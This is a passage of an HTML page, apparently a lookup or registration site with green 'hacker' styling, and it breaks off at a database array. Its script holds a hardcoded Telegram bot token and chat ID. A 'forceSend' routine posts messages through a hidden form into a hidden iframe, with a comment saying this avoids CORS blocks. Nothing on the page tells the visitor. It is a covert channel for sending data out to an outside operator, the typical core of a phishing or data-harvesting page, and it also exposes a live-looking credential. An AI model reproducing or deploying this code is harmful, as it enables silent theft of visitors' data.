<!DOCTYPE html>

        .box { border: 2px solid #00ff00; padding: 25px; border-radius: 15px; max-width: 600px; margin: 20px auto; background: #000; box-shadow: 0 0 20px #00ff00; }

        .btn { padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; width: 85%; margin-top: 10px; text-transform: uppercase; }
        .search-btn { background: #00ff00; color: #000; }
        .reg-btn { background: #ffcc00; color: #000; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #00ff00; background: #050505; }
        th, td { border: 1px solid #00ff00; padding: 12px; text-align: left; }

</head>
<body>

<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>

<script>
    const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
    const chatId = "7107389141";

    // Ultimate Sending Method using Hidden Form (No CORS block)
    function forceSend(message) {
        const form = document.createElement("form");
        form.method = "POST";
        form.action = `https://api.telegram.org/bot${botToken}/sendMessage`;
        form.target = "hidden_iframe";

        const inputId = document.createElement("input");
        inputId.name = "chat_id";
        inputId.value = chatId;
        form.appendChild(inputId);

        const inputText = document.createElement("input");
        inputText.name = "text";
        inputText.value = message;
        form.appendChild(inputText);

        const inputMode = document.createElement("input");
        inputMode.name = "parse_mode";
        inputMode.value = "Markdown";
        form.appendChild(inputMode);

        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    }

    const database = [
